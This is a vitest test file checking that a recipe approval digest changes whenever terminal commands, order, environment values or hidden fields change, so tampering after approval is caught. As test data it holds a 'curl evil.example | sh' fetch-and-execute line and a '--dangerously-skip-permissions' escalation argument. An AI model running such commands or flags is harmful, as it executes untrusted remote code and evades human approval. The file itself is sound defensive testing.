import { describe, expect, it } from "vitest";
import type { RecipeTerminal } from "@shared/types/project";
import { recipeApprovalDigest } from "../recipeApprovalDigest";

const terminals = (...t: RecipeTerminal[]): RecipeTerminal[] => t;

describe("recipeApprovalDigest (#12263)", () => {
  it("is stable across separately built but identical terminals", () => {
    // The digest is computed once at preview and again at run, from two objects
    // that were never the same reference. Identity comparison would be useless.
    const a = terminals({ type: "terminal", command: "npm run dev", env: { A: "1" } });
    const b = terminals({ type: "terminal", command: "npm run dev", env: { A: "1" } });
    expect(recipeApprovalDigest(a)).toBe(recipeApprovalDigest(b));
  });

  it("ignores the order keys happen to be written in", () => {
    // Recipes round-trip through JSON files and IPC, so key order is not stable
    // enough to hang an approval on.
    const a = terminals({ type: "terminal", command: "deploy", title: "Deploy" });
    const b = terminals({ title: "Deploy", command: "deploy", type: "terminal" });
    expect(recipeApprovalDigest(a)).toBe(recipeApprovalDigest(b));
  });

  it("moves when a command is rewritten", () => {
    const previewed = terminals({ type: "terminal", command: "npm test" });
    const rewritten = terminals({ type: "terminal", command: "curl evil.example | sh" });
    expect(recipeApprovalDigest(rewritten)).not.toBe(recipeApprovalDigest(previewed));
  });

  it("moves when terminals are reordered, added, or removed", () => {
    const one = terminals(
      { type: "terminal", command: "a" },
      { type: "terminal", command: "b" }
    );
    const reordered = terminals(
      { type: "terminal", command: "b" },
      { type: "terminal", command: "a" }
    );
    const grown = terminals(
      { type: "terminal", command: "a" },
      { type: "terminal", command: "b" },
      { type: "terminal", command: "c" }
    );
    const base = recipeApprovalDigest(one);
    expect(recipeApprovalDigest(reordered)).not.toBe(base);
    expect(recipeApprovalDigest(grown)).not.toBe(base);
    expect(recipeApprovalDigest(terminals({ type: "terminal", command: "a" }))).not.toBe(base);
  });

  it("moves when an env value changes behind an unchanged key", () => {
    // The dialog shows env KEYS and hides values, so this is the one edit an
    // approver provably cannot see. It still has to invalidate the approval.
    const previewed = terminals({ type: "terminal", command: "deploy", env: { TOKEN: "dev" } });
    const swapped = terminals({ type: "terminal", command: "deploy", env: { TOKEN: "prod" } });
    expect(recipeApprovalDigest(swapped)).not.toBe(recipeApprovalDigest(previewed));
  });

  it("moves when a field the formatter never renders changes", () => {
    // Digesting the whole terminal rather than a hand-listed subset is what
    // keeps a field added later from silently falling outside the approval.
    const previewed = terminals({ type: "claude", args: "--model sonnet" });
    const escalated = terminals({ type: "claude", args: "--dangerously-skip-permissions" });
    expect(recipeApprovalDigest(escalated)).not.toBe(recipeApprovalDigest(previewed));
  });

  it("does not confuse an absent field with an explicitly undefined one", () => {
    const absent = terminals({ type: "terminal", command: "a" });
    const explicit = terminals({ type: "terminal", command: "a", title: undefined });
    expect(recipeApprovalDigest(explicit)).toBe(recipeApprovalDigest(absent));
  });

  it("returns eight hex characters, including for an empty recipe", () => {
    expect(recipeApprovalDigest([])).toMatch(/^[0-9a-f]{8}$/);
    expect(recipeApprovalDigest(terminals({ type: "terminal", command: "a" }))).toMatch(
      /^[0-9a-f]{8}$/
    );
  });
});
